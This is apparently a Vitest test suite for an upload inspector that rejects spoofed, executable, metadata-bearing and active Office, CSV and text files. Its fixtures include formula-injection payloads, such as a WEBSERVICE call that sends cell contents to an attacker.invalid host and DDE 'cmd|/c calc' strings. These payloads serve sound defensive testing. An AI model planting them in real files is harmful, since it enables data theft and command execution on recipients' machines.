// @vitest-environment node
import { createHash } from "node:crypto";
import { crc32, deflateSync } from "node:zlib";
import { strToU8, zipSync } from "fflate";
import { describe, expect, it } from "vitest";
import { inspectPrivateFileBytes } from "../api/_lib/privateFileSafety.js";

function inspect(bytes, filename = "notes.txt", mimeType = "text/plain") {
  return inspectPrivateFileBytes(bytes, { filename, mimeType, expectedSize: bytes.length });
}

function pngChunk(type, data) {
  const name = Buffer.from(type);
  const output = Buffer.alloc(data.length + 12);
  output.writeUInt32BE(data.length);
  name.copy(output, 4);
  data.copy(output, 8);
  output.writeUInt32BE(crc32(Buffer.concat([name, data])), output.length - 4);
  return output;
}

function png(extraChunks = [], width = 1, height = 1) {
  const header = Buffer.alloc(13);
  header.writeUInt32BE(width, 0);
  header.writeUInt32BE(height, 4);
  header[8] = 8;
  header[9] = 6;
  return Buffer.concat([
    Buffer.from("89504e470d0a1a0a", "hex"), pngChunk("IHDR", header),
    ...extraChunks, pngChunk("IDAT", deflateSync(Buffer.alloc((width * 4 + 1) * height))),
    pngChunk("IEND", Buffer.alloc(0)),
  ]);
}

function gpsExif() {
  // Valid little-endian TIFF: IFD0 points to GPS latitude N 40°42′46″.
  const data = Buffer.alloc(80);
  data.write("II", 0); data.writeUInt16LE(42, 2); data.writeUInt32LE(8, 4);
  data.writeUInt16LE(1, 8); data.writeUInt16LE(0x8825, 10);
  data.writeUInt16LE(4, 12); data.writeUInt32LE(1, 14); data.writeUInt32LE(26, 18);
  data.writeUInt16LE(2, 26); data.writeUInt16LE(1, 28);
  data.writeUInt16LE(2, 30); data.writeUInt32LE(2, 32); data.write("N", 36);
  data.writeUInt16LE(2, 40); data.writeUInt16LE(5, 42);
  data.writeUInt32LE(3, 44); data.writeUInt32LE(56, 48);
  [40, 42, 46].forEach((value, index) => {
    data.writeUInt32LE(value, 56 + index * 8); data.writeUInt32LE(1, 60 + index * 8);
  });
  return data;
}

function docx(extra = {}) {
  return Buffer.from(zipSync({
    "[Content_Types].xml": strToU8('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/></Types>'),
    "_rels/.rels": strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/></Relationships>'),
    "word/document.xml": strToU8('<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:p><w:r><w:t>Synthetic document</w:t></w:r></w:p></w:body></w:document>'),
    ...extra,
  }));
}

const DOCX = "application/vnd.openxmlformats-officedocument.wordprocessingml.document";
const XLSX = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet";

function xlsx(formula, extra = {}) {
  const sheetNamespace = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
  return Buffer.from(zipSync({
    "[Content_Types].xml": strToU8('<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/><Default Extension="xml" ContentType="application/xml"/><Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/><Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/></Types>'),
    "_rels/.rels": strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/></Relationships>'),
    "xl/workbook.xml": strToU8(`<workbook xmlns="${sheetNamespace}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><sheets><sheet name="Synthetic" sheetId="1" r:id="rId1"/></sheets></workbook>`),
    "xl/_rels/workbook.xml.rels": strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/></Relationships>'),
    "xl/worksheets/sheet1.xml": strToU8(`<worksheet xmlns="${sheetNamespace}"><sheetData><row r="1"><c r="A1"><f>${formula}</f><v>0</v></c></row></sheetData></worksheet>`),
    ...extra,
  }));
}

describe("private upload byte inspection", async () => {
  it("binds valid UTF-8 bytes to their exact digest and size without asserting a malware verdict", async () => {
    const bytes = Buffer.from("Synthetic notes — no protected data.\n");
    expect(await inspect(bytes)).toEqual({
      profile: "structure-only",
      mimeType: "text/plain", sizeBytes: bytes.length,
      sha256: createHash("sha256").update(bytes).digest("hex"),
    });
  });

  it.each([Buffer.alloc(0), Buffer.alloc(10 * 1024 * 1024 + 1)])("rejects empty or oversized input", async (bytes) => {
    await expect(inspect(bytes)).rejects.toThrow(/size/);
  });

  it("rejects a registration size that does not describe the stored bytes", async () => {
    await expect(inspectPrivateFileBytes(Buffer.from("notes"), {
      filename: "notes.txt", mimeType: "text/plain", expectedSize: 4,
    })).rejects.toThrow(/size/);
  });

  it.each([
    [Buffer.from("%PDF-1.7\n%%EOF"), "notes.txt", "text/plain"],
    [Buffer.from("plain text"), "record.pdf", "application/pdf"],
    [Buffer.from("plain text"), "record.pdf", "text/plain"],
  ])("rejects MIME or extension spoofing", async (bytes, filename, mimeType) => {
    await expect(inspect(bytes, filename, mimeType)).rejects.toThrow(/mime|extension/);
  });

  it.each([
    Buffer.from("4d5a90000300000004000000ffff0000", "hex"),
    Buffer.from("7f454c4602010100", "hex"),
    Buffer.from("cffaedfe07000001", "hex"),
    Buffer.from("#!/bin/sh\necho synthetic\n"),
  ])("rejects executable signatures even under a text name and MIME", async (bytes) => {
    await expect(inspect(bytes)).rejects.toThrow(/executable/);
  });

  it.each([Buffer.from([0xff, 0xfe, 0x00]), Buffer.from("hello\0world")])("rejects binary data masquerading as UTF-8 text", async (bytes) => {
    await expect(inspect(bytes)).rejects.toThrow(/text|mime/);
  });

  // CSV AND TXT ARE SPREADSHEET INPUTS.
  //
  // A `.csv` reaches a staff recipient who opens it in Excel, Numbers or
  // LibreOffice, and each of them evaluates a cell beginning with `=`, `+`, `-`
  // or `@` as a formula — enough to reach the network on open, or to raise a
  // DDE prompt that runs a local command. The XLSX path already refuses these
  // classes; a CSV carrying the same expression was reaching the ledger with a
  // clean structural verdict purely because it was "text".
  it.each([
    // The reviewer's example: exfiltrates the neighbouring cell on open.
    ['=WEBSERVICE("https://attacker.invalid/?x="&A1)', "sheet.csv", "text/csv"],
    ["name,note\nAda,=WEBSERVICE(\"https://attacker.invalid/\")\n", "sheet.csv", "text/csv"],
    // The other three leads, including the quoted and tab-prefixed variants
    // spreadsheets ignore when they classify a cell.
    ["+cmd|'/c calc'!A0", "sheet.csv", "text/csv"],
    ["-1+cmd|'/c calc'!A0", "sheet.csv", "text/csv"],
    ["@SUM(1+9)*cmd|'/c calc'!A0", "sheet.csv", "text/csv"],
    ['name,"=1+1"\n', "sheet.csv", "text/csv"],
    ["name,\t=1+1\n", "sheet.csv", "text/csv"],
    ["name,\r=1+1\n", "sheet.csv", "text/csv"],
    // A DDE-style link and a remote-call function anywhere in the text — this
    // half of the rule applies to `text/plain` as well, because an active
    // expression is active whatever the file is called.
    ["report\ncmd|'/c calc'!A0\n", "sheet.csv", "text/csv"],
    ["note\nIMPORTXML(\"https://attacker.invalid/\",\"//a\")\n", "notes.txt", "text/plain"],
    ["report\ncmd|'/c calc'!A0\n", "notes.txt", "text/plain"],
  ])("refuses an active spreadsheet formula in delimited text", async (text, filename, mimeType) => {
    await expect(inspect(Buffer.from(text), filename, mimeType))
      .rejects.toThrow("private-file-text-active-formula");
  });

  // A refusal that rejected every negative number would reject most real
  // financial exports, so a cell that IS a numeric literal stays data.
  it.each([
    ["amount,note\n-5,late fee\n+1.5,credit\n-1,200.00,adjustment\n+2e9,large\n", "sheet.csv", "text/csv"],
    ["Synthetic notes — no protected data.\n", "notes.txt", "text/plain"],
    ["name,email\nAda,ada@example.invalid\n", "sheet.csv", "text/csv"],
    // A pipe and a bang that are not a DDE link.
    ["status|note\nopen|escalated\n", "notes.txt", "text/plain"],
  ])("accepts ordinary delimited data, including signed numbers", async (text, filename, mimeType) => {
    const bytes = Buffer.from(text);
    await expect(inspect(bytes, filename, mimeType)).resolves.toMatchObject({ mimeType, sizeBytes: bytes.length });
  });

  // THE CELL-LEAD RULE IS FOR DECLARED SPREADSHEETS ONLY.
  //
  // A `.txt` is prose. A note whose line starts with a bare `-` or `+` bullet
  // is the ordinary case, and refusing it would be a STRUCTURAL rejection the
  // ledger records as `blocked` — permanent, for a member's meeting notes. The
  // expressions that actually reach the network or raise a DDE prompt are
  // still refused in `text/plain` by the case above, so nothing opens up here.
  it.each([
    "- first bullet\n- second bullet\n",
    "+ added a step\n",
    "=== section heading ===\n",
    "@steward please review\n",
    "heading\tvalue\nrow\t=1+1\n",
    "=1+1\n",
  ])("accepts a plain-text note whose line begins with a formula lead", async (text) => {
    const bytes = Buffer.from(text);
    await expect(inspect(bytes, "notes.txt", "text/plain"))
      .resolves.toMatchObject({ mimeType: "text/plain", sizeBytes: bytes.length });
    // The same bytes declared as a spreadsheet are still refused.
    await expect(inspect(bytes, "sheet.csv", "text/csv"))
      .rejects.toThrow("private-file-text-active-formula");
  });

  it("accepts a structurally valid metadata-free PNG", async () => {
    expect((await inspect(png(), "image.png", "image/png")).mimeType).toBe("image/png");
  });

  it("rejects a valid PNG carrying GPS EXIF instead of calling the bytes sanitized", async () => {
    await expect(inspect(png([pngChunk("eXIf", gpsExif())]), "image.png", "image/png")).rejects.toThrow(/metadata/);
  });

  it("rejects image text metadata, corrupt chunks and trailing polyglot bytes", async () => {
    await expect(inspect(png([pngChunk("tEXt", Buffer.from("Location\0synthetic GPS"))]), "image.png", "image/png")).rejects.toThrow(/metadata/);
    const corrupt = png(); corrupt[corrupt.length - 1] ^= 1;
    await expect(inspect(corrupt, "image.png", "image/png")).rejects.toThrow(/image|checksum/);
    await expect(inspect(Buffer.concat([png(), Buffer.from("MZpayload")]), "image.png", "image/png")).rejects.toThrow(/image|trailing/);
  });

  it("accepts a bounded ordinary DOCX package", async () => {
    expect((await inspect(docx(), "document.docx", DOCX)).mimeType).toBe(DOCX);
  });

  it.each([
    { "../escape.txt": strToU8("synthetic") },
    { "word/vbaProject.bin": strToU8("synthetic macro") },
    { "word/embeddings/payload.exe": Buffer.from("MZsynthetic") },
  ])("rejects traversal and executable Office package members", async (extra) => {
    await expect(inspect(docx(extra), "document.docx", DOCX)).rejects.toThrow(/archive|executable/);
  });

  it("rejects malformed archives and inflated uncompressed-size declarations", async () => {
    await expect(inspect(docx().subarray(0, -8), "document.docx", DOCX)).rejects.toThrow(/archive/);
    const bomb = docx();
    const directory = bomb.indexOf(Buffer.from("504b0102", "hex"));
    bomb.writeUInt32LE(26 * 1024 * 1024, directory + 24);
    await expect(inspect(bomb, "document.docx", DOCX)).rejects.toThrow(/archive/);
  });

  it("shares one expansion budget across an archive and all embedded images", async () => {
    const largeImage = png([], 2048, 2048);
    expect((await inspect(largeImage, "image.png", "image/png")).mimeType).toBe("image/png");
    await expect(inspect(docx({ "word/media/a.png": largeImage, "word/media/b.png": largeImage }), "document.docx", DOCX)).rejects.toThrow(/expanded-size/);
  });

  it.each([
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:instrText>D&#68;EAUTO remote</w:instrText></w:body></w:document>',
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:instrText>DD</w:instrText><w:instrText>EAUTO remote</w:instrText></w:body></w:document>',
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:fldSimple w:instr="INCLUDETEXT remote"/></w:body></w:document>',
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:instrText>IMPORT remote</w:instrText></w:body></w:document>',
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body><w:instrText>LINK remote</w:instrText></w:body></w:document>',
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>',
    '<not-an-office-document/>',
  ])("rejects active or malformed Office XML", async (xml) => {
    await expect(inspect(docx({ "word/document.xml": strToU8(xml) }), "document.docx", DOCX)).rejects.toThrow(/archive/);
  });

  it("rejects an externally loaded Office template while preserving ordinary hyperlinks", async () => {
    const rel = (type) => strToU8(`<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/${type}" Target="https://example.invalid/synthetic" TargetMode="Extern&#97;l"/></Relationships>`);
    await expect(inspect(docx({ "word/_rels/document.xml.rels": rel("attachedTemplate") }), "document.docx", DOCX)).rejects.toThrow(/archive/);
    expect((await inspect(docx({ "word/_rels/document.xml.rels": rel("hyperlink") }), "document.docx", DOCX)).mimeType).toBe(DOCX);
    const prefixed = strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://example.invalid/synthetic" p:TargetMode="External"/></Relationships>');
    await expect(inspect(docx({ "word/_rels/document.xml.rels": prefixed }), "document.docx", DOCX)).rejects.toThrow(/archive/);
  });

  it("accepts ordinary spreadsheet formulas but rejects DDE and automatic web requests", async () => {
    expect(await inspect(xlsx("SUM(1,2)"), "sheet.xlsx", XLSX)).toMatchObject({ profile: "structure-only", mimeType: XLSX });
    for (const formula of ["synthetic|'example'!A0", 'WEBSERV&#73;CE("https://example.invalid/synthetic")']) {
      await expect(inspect(xlsx(formula), "sheet.xlsx", XLSX)).rejects.toThrow(/archive/);
    }
  });

  // Record #9500: the XLSX formula check must refuse every remote-call name the
  // CSV rule refuses, matched on the function name in any of the forms a
  // workbook stores it.
  const REMOTE_CALL_NAMES = ["WEBSERVICE", "IMPORTXML", "IMPORTDATA", "IMPORTHTML", "IMPORTFEED", "IMPORTRANGE", "RTD", "DDE"];

  it.each(REMOTE_CALL_NAMES)("rejects a workbook whose cell formula calls %s", async (name) => {
    const forms = [
      `${name}("https://example.invalid/synthetic")`,
      `=${name}("https://example.invalid/synthetic")`,
      `${name.toLowerCase()}("https://example.invalid/synthetic")`,
      `_xlfn.${name}("https://example.invalid/synthetic")`,
      `SUM(A2,1)+LEN(_xlfn._xlws.${name}("https://example.invalid/synthetic","//a"))`,
      `${name}${" ".repeat(40)}("https://example.invalid/synthetic")`,
    ];
    for (const formula of forms) {
      await expect(inspect(xlsx(formula), "sheet.xlsx", XLSX), formula).rejects.toThrow("private-file-archive-active-formula");
    }
  });

  it.each(REMOTE_CALL_NAMES)("rejects %s inside a workbook defined name", async (name) => {
    const namespace = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
    const bytes = xlsx("SyntheticName", {
      "xl/workbook.xml": strToU8(`<workbook xmlns="${namespace}"><definedName name="SyntheticName">_xlfn.${name}("https://example.invalid/synthetic")</definedName></workbook>`),
    });
    await expect(inspect(bytes, "sheet.xlsx", XLSX)).rejects.toThrow("private-file-archive-active-formula");
  });

  it.each([
    'IF(A1=1,"RTD(","")',
    'HYPERLINK("https://example.invalid/?q=IMPORTXML(1)","Synthetic link")',
    "'RTD(x)'!A1+1",
    'CONCAT("say ""DDE(""","x")',
    "'It''s IMPORTRANGE('!B2",
    'LEN(&quot;WEBSERVICE(&quot;)',
  ])("accepts a workbook formula that only quotes a listed name: %s", async (formula) => {
    expect(await inspect(xlsx(formula), "sheet.xlsx", XLSX)).toMatchObject({ profile: "structure-only", mimeType: XLSX });
  });

  it.each([
    'CONCAT("RTD(",RTD("synthetic.server","topic"))',
    'IF(A1,"x",IMPORTXML("https://example.invalid/synthetic","//a"))',
    "'Sheet One'!A1&amp;WEBSERVICE(\"https://example.invalid/synthetic\")",
    '"a""b"&amp;DDE("x","y","z")',
    '"unclosed IMPORTXML(A1)',
    "'unclosed RTD(1)",
  ])("still rejects a real call beside or after quoted text: %s", async (formula) => {
    await expect(inspect(xlsx(formula), "sheet.xlsx", XLSX)).rejects.toThrow("private-file-archive-active-formula");
  });

  it("still accepts ordinary workbook formulas and an external HYPERLINK relationship", async () => {
    for (const formula of [
      "SUM(A1:A9)", "IF(B2&gt;0,B2*1.5,0)", "VLOOKUP(A2,Rates!A:B,2,FALSE)", "_xlfn.XLOOKUP(A2,B:B,C:C)",
      'HYPERLINK("https://example.invalid/synthetic","Synthetic link")', "IMPORTANT_TOTAL+1", "SUMPRODUCT(RTD_COUNT,2)",
    ]) {
      expect(await inspect(xlsx(formula), "sheet.xlsx", XLSX), formula).toMatchObject({ profile: "structure-only", mimeType: XLSX });
    }
    const hyperlink = xlsx('HYPERLINK("https://example.invalid/synthetic")', {
      "xl/worksheets/_rels/sheet1.xml.rels": strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.invalid/synthetic" TargetMode="External"/></Relationships>'),
    });
    expect(await inspect(hyperlink, "sheet.xlsx", XLSX)).toMatchObject({ profile: "structure-only", mimeType: XLSX });
  });

  it.each(["ddeLink", "oleLink"])("rejects native spreadsheet %s serialization", async (link) => {
    const namespace = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
    const bytes = xlsx("[1]!A0", {
      "xl/workbook.xml": strToU8(`<workbook xmlns="${namespace}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><externalReferences><externalReference r:id="rId2"/></externalReferences></workbook>`),
      "xl/_rels/workbook.xml.rels": strToU8('<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink" Target="externalLinks/externalLink1.xml"/></Relationships>'),
      "xl/externalLinks/externalLink1.xml": strToU8(`<externalLink xmlns="${namespace}"><${link} ddeService="synthetic" ddeTopic="synthetic"/></externalLink>`),
    });
    await expect(inspect(bytes, "sheet.xlsx", XLSX)).rejects.toThrow("private-file-archive-active-formula");
  });

  it.each(["definedName", "calculatedColumnFormula"])("inspects active formulas stored in %s", async (tag) => {
    for (const namespace of ["http://schemas.openxmlformats.org/spreadsheetml/2006/main", "http://purl.oclc.org/ooxml/spreadsheetml/main"]) {
      for (const formula of ["synthetic|'example'!A0", 'WEBSERV&#73;CE("https://example.invalid/synthetic")']) {
        const bytes = xlsx("SyntheticName", {
          "xl/workbook.xml": strToU8(`<workbook xmlns="${namespace}"><${tag} name="SyntheticName">${formula}</${tag}></workbook>`),
        });
        await expect(inspect(bytes, "sheet.xlsx", XLSX)).rejects.toThrow("private-file-archive-active-formula");
      }
    }
  });
});

// Record #9542: a workbook keeps formulas, and fetching sources, outside its
// cells too. Each place below is refused with the same reason as a cell
// formula; every data connection is refused; IMAGE is refused; and the text
// path squeezes whitespace before the remote-call check.
describe("remote fetches a workbook or text file keeps outside its cell formulas", () => {
  const SHEET = "http://schemas.openxmlformats.org/spreadsheetml/2006/main";
  const URL = "https://example.invalid/synthetic";
  const sheet = (body) => ({ "xl/worksheets/sheet1.xml": strToU8(`<worksheet xmlns="${SHEET}"><sheetData><row r="1"><c r="A1"><v>1</v></c></row></sheetData>${body}</worksheet>`) });
  const conditional = (formula) => sheet(`<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>${formula}</formula></cfRule></conditionalFormatting>`);
  const validation = (first, second = "10") => sheet(`<dataValidations count="1"><dataValidation type="whole" sqref="A1"><formula1>${first}</formula1><formula2>${second}</formula2></dataValidation></dataValidations>`);
  const extension = (formula) => sheet(`<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:dataValidation type="list"><x14:formula1><xm:f>${formula}</xm:f></x14:formula1><xm:sqref>A1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst>`);
  const totals = (formula) => ({ "xl/tables/table1.xml": strToU8(`<table xmlns="${SHEET}" id="1" name="Synthetic" displayName="Synthetic" ref="A1:A3" totalsRowCount="1"><tableColumns count="1"><tableColumn id="1" name="Amount" totalsRowFunction="custom"><totalsRowFormula>${formula}</totalsRowFormula></tableColumn></tableColumns></table>`) });
  const pivotField = (formula) => ({ "xl/pivotCache/pivotCacheDefinition1.xml": strToU8(`<pivotCacheDefinition xmlns="${SHEET}"><cacheSource type="worksheet"><worksheetSource ref="A1:A3" sheet="Synthetic"/></cacheSource><cacheFields count="2"><cacheField name="Amount" numFmtId="0"/><cacheField name="Calc" numFmtId="0" formula="${formula}" databaseField="0"/></cacheFields></pivotCacheDefinition>`) });
  const pivotItem = (formula) => ({ "xl/pivotTables/pivotTable1.xml": strToU8(`<pivotTableDefinition xmlns="${SHEET}" name="Synthetic" cacheId="1" dataCaption="Values"><location ref="C1:D4" firstHeaderRow="1" firstDataRow="1" firstDataCol="1"/><calculatedItems count="1"><calculatedItem formula="${formula}"><pivotArea/></calculatedItem></calculatedItems></pivotTableDefinition>`) });
  const workbook = (parts) => inspect(xlsx("SUM(1,2)", parts), "sheet.xlsx", XLSX);

  it.each([
    ["conditional formatting", conditional(`NOT(ISERROR(IMPORTXML("${URL}","//a")))`)],
    ["data validation formula1", validation(`LEN(WEBSERVICE("${URL}"))`)],
    ["data validation formula2", validation("1", `LEN(_xlfn.IMPORTDATA("${URL}"))`)],
    ["a table total", totals(`RTD("synthetic.server",,"topic")`)],
    ["xm:f extension markup", extension(`IMPORTRANGE("${URL}","A1:A3")`)],
    ["a pivot calculated field", pivotField(`Amount*LEN(IMPORTHTML(&quot;${URL}&quot;,&quot;table&quot;,1))`)],
    ["a pivot calculated item", pivotItem(`LEN(IMPORTFEED(&quot;${URL}&quot;))`)],
    ["a DDE link in conditional formatting", conditional("synthetic|'example'!A0")],
    ["IMAGE in a cell", { "xl/worksheets/sheet1.xml": strToU8(`<worksheet xmlns="${SHEET}"><sheetData><row r="1"><c r="A1"><f>_xlfn.IMAGE("${URL}.png")</f></c></row></sheetData></worksheet>`) }],
    ["IMAGE from a cell address", conditional("ISERROR(IMAGE  (B1))")],
  ])("refuses a remote call in %s with the cell-formula reason", async (_place, parts) => {
    await expect(workbook(parts)).rejects.toThrow("private-file-archive-active-formula");
  });

  it.each([
    ["a web query", `<connection id="1" name="Synthetic" type="4" refreshOnLoad="1"><webPr url="${URL}"/></connection>`],
    ["a database connection", '<connection id="1" name="Synthetic" type="1"><dbPr connection="Provider=SQLOLEDB;Data Source=synthetic.invalid" command="SELECT 1"/></connection>'],
    ["a text import", '<connection id="1" name="Synthetic" type="6"><textPr sourceFile="\\\\synthetic.invalid\\share\\rows.csv"/></connection>'],
  ])("refuses a workbook that carries %s", async (_kind, connection) => {
    const parts = { "xl/connections.xml": strToU8(`<connections xmlns="${SHEET}">${connection}</connections>`) };
    await expect(workbook(parts)).rejects.toThrow("private-file-archive-active-connection");
  });

  it("still accepts an ordinary workbook with conditional formatting, validation, a table total and a pivot table", async () => {
    const ordinary = {
      "xl/worksheets/sheet1.xml": strToU8(`<worksheet xmlns="${SHEET}"><sheetData><row r="1"><c r="A1"><f>SUM(B1:B3)</f><v>6</v></c></row></sheetData>`
        + '<conditionalFormatting sqref="A1"><cfRule type="expression" priority="1"><formula>AND(A1&gt;5,ISNUMBER(SEARCH("IMAGE(",B1)))</formula></cfRule></conditionalFormatting>'
        + '<dataValidations count="2"><dataValidation type="list" sqref="B1"><formula1>"Yes,No,RTD("</formula1></dataValidation><dataValidation type="whole" sqref="B2"><formula1>1</formula1><formula2>Images!A1</formula2></dataValidation></dataValidations>'
        + '<extLst><ext uri="{CCE6A557-97BC-4b89-ADB6-D9C93CAAB3DF}" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><x14:dataValidations count="1" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main"><x14:dataValidation type="list"><x14:formula1><xm:f>Synthetic!$A$1:$A$3</xm:f></x14:formula1><xm:sqref>C1</xm:sqref></x14:dataValidation></x14:dataValidations></ext></extLst></worksheet>'),
      ...totals("SUBTOTAL(109,[Amount])"),
      ...pivotField("Amount*2"),
      ...pivotItem("Amount+1"),
    };
    expect(await workbook(ordinary)).toMatchObject({ profile: "structure-only", mimeType: XLSX });
  });

  it.each([
    [`IMPORTXML${" ".repeat(17)}("${URL}","//a")`, "notes.txt", "text/plain"],
    [`WEBSERVICE${"\t \n".repeat(12)}("${URL}")`, "notes.txt", "text/plain"],
    [`name,note\nAda,see RTD${" ".repeat(30)}("synthetic.server","topic")\n`, "sheet.csv", "text/csv"],
    [`see IMAGE("${URL}.png")\n`, "notes.txt", "text/plain"],
    [`name,"IMAGE(""${URL}.png"")"\n`, "sheet.csv", "text/csv"],
    ['logo,_xlfn.IMAGE( "//example.invalid/logo.png")\n', "sheet.csv", "text/csv"],
  ])("refuses a spaced-out remote call or an IMAGE address in text: %s", async (text, filename, mimeType) => {
    await expect(inspect(Buffer.from(text), filename, mimeType)).rejects.toThrow("private-file-text-active-formula");
  });

  it.each([
    "The image (attached) shows the board.\n",
    "Image(s) of the notice are in the binder.\n",
    `Our logo image (${URL}.png) is on the site.\n`,
    "IMPORTANT (read before the meeting)\n",
  ])("still accepts a note that only mentions an image or a long word: %s", async (text) => {
    const bytes = Buffer.from(text);
    await expect(inspect(bytes, "notes.txt", "text/plain")).resolves.toMatchObject({ mimeType: "text/plain", sizeBytes: bytes.length });
  });
});
